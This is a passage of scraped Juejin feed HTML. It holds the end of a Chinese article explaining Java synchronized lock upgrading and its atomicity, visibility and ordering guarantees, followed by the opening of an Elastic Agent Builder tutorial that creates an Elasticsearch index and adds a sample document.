</ol>
<h5 data-id="heading-17">轻量级锁的膨胀：</h5>
<p>若自旋失败（如自旋次数耗尽仍未获取锁，或有更多线程参与竞争），轻量级锁会 “膨胀” 为重量级锁：</p>
<ol>
<li>将 Mark Word 中的指针改为 “指向 Monitor 的指针”，锁状态变为 11。</li>
<li>未获取锁的线程进入 EntryList 阻塞（BLOCKED 状态），避免无效自旋浪费 CPU。</li>
</ol>
<h4 data-id="heading-18">（3）重量级锁：激烈竞争场景的兜底</h4>
<p><strong>适用场景</strong>：多个线程同时竞争锁，且竞争时间长（如线程持有锁执行耗时操作）。<strong>实现原理</strong>：依赖操作系统的 <strong>互斥量（Mutex）</strong>  实现，线程竞争失败会直接阻塞（从用户态切换到内核态），等待被唤醒。<strong>特点</strong>：开销最大（线程阻塞 / 唤醒需内核态切换），但稳定性最高，适合激烈竞争场景。</p>
<h3 data-id="heading-19">2. 其他关键优化</h3>
<h4 data-id="heading-20">（1）自旋锁与适应性自旋锁</h4>
<ul>
<li>
<p><strong>自旋锁</strong>：轻量级锁竞争时，线程不直接阻塞，而是自旋（空循环）一段时间（默认 10 次），等待持有锁的线程快速释放。自旋无需切换内核态，适合锁持有时间短的场景。</p>
</li>
<li>
<p><strong>适应性自旋锁</strong>：JDK 1.6 优化，自旋次数不再固定，而是根据 “历史自旋成功率” 动态调整：</p>
<ul>
<li>若之前自旋成功获取锁，下次自旋次数增加（如 20 次）。</li>
<li>若之前自旋失败，下次自旋次数减少或直接放弃自旋（避免浪费 CPU）。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-21">（2）锁消除</h4>
<p>JIT 编译器在编译时，通过<strong>逃逸分析</strong>判断：若一个锁对象仅被当前线程访问（无逃逸到其他线程），则直接消除该锁。</p>
<ul>
<li>示例：<code>StringBuffer</code> 的 <code>append()</code> 方法是同步方法，但单线程环境下，JIT 会消除其锁（因为 <code>StringBuffer</code> 对象未逃逸，无需同步）。</li>
</ul>
<h4 data-id="heading-22">（3）锁粗化</h4>
<p>若多个连续的锁操作针对<strong>同一个对象</strong>，JIT 会将这些分散的锁合并为一个 “粗粒度锁”，减少锁的获取 / 释放次数。</p>
<ul>
<li>示例：循环中多次调用 <code>synchronized (this) { ... }</code>，JIT 会将锁粗化到循环外部，仅获取一次锁即可。</li>
</ul>
<h2 data-id="heading-23">三、synchronized 如何保证可见性，有序性，原子性</h2>
<p><code>synchronized</code> 是 Java 中唯一能同时保证 <strong>原子性、可见性、有序性</strong> 的内置同步机制，其保障逻辑完全基于底层的 <strong>Monitor 监视器锁</strong> 和 <strong>JMM（Java 内存模型）规则</strong>，与之前提到的底层原理（如锁获取 / 释放、对象头操作）深度绑定。下面分三个特性，拆解其具体保障机制：</p>
<h3 data-id="heading-24">1、保证原子性：基于 Monitor 的互斥执行</h3>
<h4 data-id="heading-25">1.1. 原子性的定义</h4>
<p>原子性指 <strong>一个操作或一组操作，要么全部执行且执行过程不被打断，要么全部不执行</strong>（不可分割）。比如 <code>i++</code> 本质是「读取 i → 加 1 → 写入 i」三个步骤，若不加同步，多线程环境下可能被其他线程打断，导致结果错误。</p>
<h4 data-id="heading-26">1.2. synchronized 如何保证原子性？</h4>
<p>核心逻辑：<strong>通过 Monitor 锁的互斥性，确保同步块 / 方法在同一时间只能被一个线程执行</strong>。</p>
<p>结合底层原理的细节：</p>
<ul>
<li>线程要进入同步块 / 方法，必须先获取 Monitor 的所有权（通过 <code>monitorenter</code> 指令或 <code>ACC_SYNCHRONIZED</code> 标志）。</li>
<li>Monitor 的 <code>Owner</code> 字段同一时间只能指向一个线程（互斥性），其他竞争线程会被阻塞在 <code>EntryList</code>（BLOCKED 状态），直到当前线程释放锁。</li>
<li>同步块 / 方法内的所有操作，会作为一个 “整体” 被执行 —— 在当前线程释放锁前，其他线程无法插入执行，因此这组操作具备不可分割的原子性。</li>
</ul>
<h4 data-id="heading-27">示例验证：</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">increment</span><span class="hljs-params">()</span> </span>{
    count++; <span class="hljs-comment">// 读取、加1、写入三个步骤，被synchronized保证为原子操作</span>
}
</code></pre>
<ul>
<li>若不加 <code>synchronized</code>，1000 个线程各调用 1000 次 <code>increment()</code>，最终 <code>count</code> 会小于 1000000（因步骤被打断）。</li>
<li>加 <code>synchronized</code> 后，<code>count++</code> 的三个步骤被 “串行化”，最终结果必然是 1000000，原子性得到保证。</li>
</ul>
<h4 data-id="heading-28">补充：可重入性不破坏原子性</h4>
<p><code>synchronized</code> 是可重入锁（同一线程可多次获取同一锁），但多次获取不会打破互斥性 —— 其他线程仍需等待当前线程完全释放锁（所有重入的锁都释放）才能竞争，因此原子性依然成立。</p>
<h3 data-id="heading-29">2、保证可见性：基于锁释放 / 获取的内存刷新规则</h3>
<h4 data-id="heading-30">2.1. 可见性的定义</h4>
<p>可见性指 <strong>一个线程修改了共享变量的值后，其他线程能立刻感知到这个修改</strong>。若没有可见性保障，线程 A 修改的变量可能只存在于自己的工作内存中，未同步到主内存，线程 B 读取的仍是主内存中旧值。</p>
<h4 data-id="heading-31">2.2. synchronized 如何保证可见性？</h4>
<p>核心逻辑：<strong>JMM 为 <code>synchronized</code> 定义了「锁释放 - 获取的内存语义」，强制刷新共享变量的内存</strong>。</p>
<p>具体规则（与底层锁操作绑定）：</p>
<ul>
<li><strong>锁释放时：强制刷新工作内存到主内存</strong>线程释放 Monitor 锁时（执行 <code>monitorexit</code> 指令，或方法执行完毕），JVM 会触发一个动作：将该线程在工作内存中修改的所有共享变量，<strong>强制刷新到主内存</strong>（清空工作内存中的缓存，确保主内存是最新值）。</li>
<li><strong>锁获取时：强制从主内存加载最新值</strong>线程获取 Monitor 锁时（执行 <code>monitorenter</code> 指令，或调用同步方法），JVM 会触发一个动作：将该线程工作内存中对应的共享变量 <strong>置为无效</strong>，后续读取该变量时，必须从主内存重新加载（确保拿到的是最新值）。</li>
</ul>
<h4 data-id="heading-32">示例验证：</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> flag = <span class="hljs-literal">false</span>;
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">setFlag</span><span class="hljs-params">()</span> </span>{
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 线程A修改后，释放锁时刷新到主内存</span>
}
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">checkFlag</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (flag) { <span class="hljs-comment">// 线程B获取锁时，从主内存加载最新的flag（true）</span>
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"感知到flag修改"</span>);
    }
}
</code></pre>
<ul>
<li>若不加 <code>synchronized</code>，线程 A 修改变量后可能未刷新到主内存，线程 B 一直读取工作内存中的旧值 <code>false</code>，无法感知修改。</li>
<li>加 <code>synchronized</code> 后，锁释放 / 获取的内存语义确保了 <code>flag</code> 的修改对其他线程可见。</li>
</ul>
<h3 data-id="heading-33">3、保证有序性：基于互斥执行 + happens-before 规则</h3>
<h4 data-id="heading-34">3.1. 有序性的定义</h4>
<p>有序性指 <strong>程序执行的顺序与代码编写的顺序一致</strong>，避免因「指令重排序」导致的多线程执行混乱。JIT 编译器、CPU 为了优化性能，会在不影响单线程执行结果的前提下重排序指令，但多线程环境下可能导致错误。</p>
<h4 data-id="heading-35">3.2. synchronized 如何保证有序性？</h4>
<p>核心逻辑：<strong>通过「互斥执行的串行化」和「JMM 的 happens-before 规则」，间接禁止指令重排序的可见性</strong>。</p>
<h5 data-id="heading-36">（1）互斥执行的串行化保障</h5>
<p>由于同步块 / 方法同一时间只能被一个线程执行，相当于将多线程执行转化为「单线程串行执行」。而单线程环境下，指令重排序不会影响执行结果（as-if-serial 语义）—— 无论指令如何重排，单线程执行的最终结果与代码顺序一致，因此多线程通过 <code>synchronized</code> 执行时，不会出现因重排序导致的逻辑错误。</p>
<h5 data-id="heading-37">（2）happens-before 规则的强约束</h5>
<p>JMM 定义了「监视器锁规则」：<strong>对同一个锁的解锁操作（unlock），happens-before 于后续对该锁的加锁操作（lock）</strong> 。</p>
<ul>
<li>
<p><code>happens-before</code> 的含义：若操作 A happens-before 操作 B，则 A 的执行结果对 B 可见，且 A 的执行顺序在 B 之前（禁止 A 之后的指令重排序到 A 之前，也禁止 B 之前的指令重排序到 B 之后）。</p>
</li>
<li>
<p>具体效果：同步块内的所有操作（解锁前的操作），happens-before 于后续获取该锁的线程执行的操作（加锁后的操作）。这意味着：</p>
<ul>
<li>同步块内的指令可以重排序，但不会重排序到同步块外部（解锁后）。</li>
<li>后续线程获取锁后，能看到前一个线程同步块内所有操作的结果（包括指令重排序后的正确结果）。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-38">示例验证（避免重排序问题）：</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> a = <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> ready = <span class="hljs-literal">false</span>;

<span class="hljs-comment">// 线程A执行</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">()</span> </span>{
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 操作1</span>
    ready = <span class="hljs-literal">true</span>;<span class="hljs-comment">// 操作2</span>
}

<span class="hljs-comment">// 线程B执行</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">read</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (ready) { <span class="hljs-comment">// 操作3</span>
        System.out.<span class="hljs-built_in">println</span>(a); <span class="hljs-comment">// 操作4，必然输出1</span>
    }
}
</code></pre>
<ul>
<li>
<p>若不加 <code>synchronized</code>，CPU 可能将线程 A 的「操作 1 和操作 2」重排序（先执行 <code>ready=true</code>，再执行 <code>a=1</code>），导致线程 B 执行时 <code>ready=true</code> 但 <code>a=0</code>，输出错误。</p>
</li>
<li>
<p>加 <code>synchronized</code> 后：</p>
<ol>
<li>线程 A 的同步块内，操作 1 和操作 2 可重排序，但不会重排序到 <code>write()</code> 方法外部（解锁后）。</li>
<li>「线程 A 解锁」happens-before「线程 B 加锁」，因此线程 B 执行时，必然能看到线程 A 操作 1 和操作 2 的最终结果（<code>a=1</code> 且 <code>ready=true</code>），输出正确。</li>
</ol>
</li>
</ul>
<h3 data-id="heading-39">4、总结：三个特性的核心保障逻辑</h3>





















<table><thead><tr><th>特性</th><th>核心保障机制</th></tr></thead><tbody><tr><td>原子性</td><td>Monitor 锁的互斥性：同步块 / 方法同一时间仅一个线程执行，操作不可分割。</td></tr><tr><td>可见性</td><td>锁释放 / 获取的内存语义：释放锁时刷新工作内存到主内存，获取锁时从主内存加载最新值。</td></tr><tr><td>有序性</td><td>1. 互斥执行转化为单线程串行（as-if-serial 语义）；2. happens-before 规则约束指令重排序。</td></tr></tbody></table>
<h2 data-id="heading-40">四、总结</h2>
<h3 data-id="heading-41">1. 底层原理核心</h3>
<p><code>synchronized</code> 基于 <strong>Monitor 监视器锁</strong> 和 <strong>对象头 Mark Word</strong> 实现，通过竞争 Monitor 所有权保证线程互斥，锁状态存储在 Mark Word 中。</p>
<h3 data-id="heading-42">2. 优化机制核心</h3>
<p>JDK 1.6+ 的优化核心是  <strong>“锁升级”</strong> ：从偏向锁（无竞争）→ 轻量级锁（轻度竞争，自旋）→ 重量级锁（激烈竞争，阻塞），按需降低开销；配合自旋锁、锁消除、锁粗化等优化，让 <code>synchronized</code> 兼顾安全性和高性能。</p>
<h3 data-id="heading-43">3. 性能对比</h3>
<ul>
<li>无竞争场景：偏向锁 &gt; 轻量级锁 &gt; 重量级锁（偏向锁几乎无开销）。</li>
<li>轻度竞争场景：轻量级锁（自旋）&gt; 重量级锁（避免内核态切换）。</li>
<li>激烈竞争场景：重量级锁（自旋无效，阻塞更高效）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开始使用 Elastic Agent Builder 和 Microsoft Agent Framework]]></title>    <link>https://juejin.cn/post/7575313772988399657</link>    <guid>https://juejin.cn/post/7575313772988399657</guid>    <pubDate>2025-11-23T08:40:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575313772988399657" data-draft-id="7575655132748349476" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开始使用 Elastic Agent Builder 和 Microsoft Agent Framework"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-11-23T08:40:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开始使用 Elastic Agent Builder 和 Microsoft Agent Framework
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:40:23.000Z" title="Sun Nov 23 2025 08:40:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：来自 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fjonathan-simon" title="https://www.elastic.co/search-labs/author/jonathan-simon" target="_blank" ref="nofollow noopener noreferrer">Jonathan Simon</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e12fa40a8534389b0387e53ff3c0016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=oIIS7CCMF2LuT17tdHYHDvoXPQk%3D" alt="" loading="lazy"/></p>
<p>逐步讲解如何使用 Elastic Agent Builder 创建一个 agent 的完整流程，然后探索如何通过由 Microsoft Agent Framework 编排的 A2A 协议来使用该 agent。</p>
<p>Agent Builder 现在作为技术预览版提供。开始使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://cloud.elastic.co/registration?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud 试用</a>，并在此查看 Agent Builder 的文档。</p>
<p>Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153865391" title="https://elasticstack.blog.csdn.net/article/details/153865391" target="_blank" ref="nofollow noopener noreferrer">9.2</a> 最近发布，并包含一个名为 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Felasticsearch%2Fagent-builder" title="https://www.elastic.co/elasticsearch/agent-builder" target="_blank" ref="nofollow noopener noreferrer">Agent Builder</a> 的新功能。它让开发者能够快速创建由 Elasticsearch 中存储的数据驱动的 AI agents 和 tools。你在 Agent Builder 中创建的任何 tools 或 agents 都可以立即在你自己的自定义 AI 应用中使用。</p>
<p>在这篇博客文章中，我们将讲解使用 Elastic Agent Builder 创建一个 agent 的所有步骤。然后我们将讲解运行一个示例 Python 应用的流程，该应用使用 Microsoft Agent Framework 来编排你的 Elastic agent。</p>
<h2 data-id="heading-0">创建一个 Elastic Serverless 项目</h2>
<p>要使用 Agent Builder，你需要一个 Elastic 部署或一个 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fserverless" title="https://www.elastic.co/cloud/serverless" target="_blank" ref="nofollow noopener noreferrer">serverless</a> 项目，所以我们先从创建一个 Elastic serverless 项目开始。进入 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">Elastic Cloud</a> 并创建一个新的 Elasticsearch <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fserverless" title="https://www.elastic.co/cloud/serverless" target="_blank" ref="nofollow noopener noreferrer">Serverless</a> 项目。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d217235199794785a2b684aba2bfb3be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=gUhNOGypdo%2FnZwsyxJRD2J2omjE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">创建一个索引并添加数据</h2>
<p>现在我们已经有了一个 Elastic 项目，让我们创建一个索引，这是 Elasticsearch 用来存储数据的地方。打开 Elastic Cloud 中的 Developer Tools，我们可以在这里运行命令来创建一个索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b428801cf1a14dc3bc53d1264f06eef3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=uclXaT4954LTq9emN2HeGCuWixA%3D" alt="" loading="lazy"/></p>
<p>复制下面的 PUT 命令，它会创建一个名为 my-docs 的索引，包含多种字段，以及利用<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fsemantic-text" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/semantic-text" target="_blank" ref="nofollow noopener noreferrer">语义搜索</a>的内容。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT /my-docs
2.  {
3.    <span class="hljs-string">"mappings"</span>: {
4.      <span class="hljs-string">"properties"</span>: {
5.        <span class="hljs-string">"title"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span> },
6.        <span class="hljs-string">"content"</span>: { 
7.          <span class="hljs-string">"type"</span>: <span class="hljs-string">"semantic_text"</span>
8.        },
9.        <span class="hljs-string">"filename"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"keyword"</span> },
10.        <span class="hljs-string">"last_modified"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"date"</span> }
11.      }
12.    }
13.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>将 PUT 命令粘贴到 Developer Tools 控制台的输入区域。把鼠标悬停在控制台中的命令上，然后点击 Run 按钮来执行该命令。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/383550b40f3649ec8f17e3e33dc2df7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=HwMjEZEUh%2B%2BJLO9AlxCU%2F1740Kc%3D" alt="" loading="lazy"/></p>
<p>下一步是向你刚创建的 my-docs 索引中添加一些数据。将下面的命令复制并粘贴到 Develop Tools 控制台中。</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT /my-docs/_doc/greetings-md
2.  {
3.    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Greetings"</span>,
4.    <span class="hljs-string">"content"</span>: <span class="hljs-string">"
5.  # Greetings

7.  ## Basic Greeting
8.  Hello!

10.  ## Helloworld Greeting
11.  Hello World! 🌎

13.  ## Not Greeting
14.  I'm only a greeting agent. 🤷

16.  "</span>,
17.    <span class="hljs-string">"filename"</span>: <span class="hljs-string">"greetings.md"</span>,
18.    <span class="hljs-string">"last_modified"</span>: <span class="hljs-string">"2025-11-04T12:00:00Z"</span>
19.  }

`AI写代码![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>点击该命令的 Run 按钮来执行命令，这将向 my-docs 索引添加一个文档。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3067081540db4b6e84b62180f196b98b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=Un1vqEg6RDYZEUoGPPHSzolxzDQ%3D" alt="" loading="lazy"/></p>
<p>如你所见，上面的命令添加了一个名为 greetings.md 的文档，其中包含不同类型的问候回应内容。</p>
<p>现在我们已经在 Elastic 索引中有了一些数据，让我们确认一下可以使用的数据。利用 Agent Builder 中默认启用的内置 Elastic AI Agent，你现在可以就你的数据进行对话。在导航菜单中选择 Agents。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/940bc29e283347bda465a0f4b54bbbf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=OabfpsMxQM7E21hne7S9ZaiZgdQ%3D" alt="" loading="lazy"/></p>
<p>然后只需问：“我有什么数据？”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a55c7d9b2177413aad033832b886877a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764492022&amp;x-signature=%2FbQdDI%2B6qLP4oo3XV4UKlM%2FpKNw%3D" alt="" loading="lazy"/></p>
<p>默认的 Elastic AI Agent 会提供当前存储在 Elastic 中数据的良好总结。</p>
<h2 data-id="heading-2">创建一个 tool</h2>
<p>此演练的下一步是创建一个能够使用存储在 Elastic 中数据的 agent。</p>
<p>如你所见，Elastic Agent Builder 中的默认 agent 已经可以用来与你的数据聊天，但要真正赋予 agent 自定义能力，它们需要通过 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2Fdocs%2Fgetting-started%2Fintro" title="https://modelcontextprotocol.io/docs/getting-started/intro" target="_blank" ref="nofollow noopener noreferrer">Model Context Protocol (MCP)</a> 访问 tools。Agent Builder 拥有完整的 tool 创建和管理功能，你可以用它快速创建自定义 MCP tools，这些 tools 会托管在与数据相同的可扩展 Elastic 项目中。</p>
<p>现在让我们在 Elastic Agent Builder 中创建一个可以访问 Elastic 中数据的 tool。点击 + New 开始。</p>
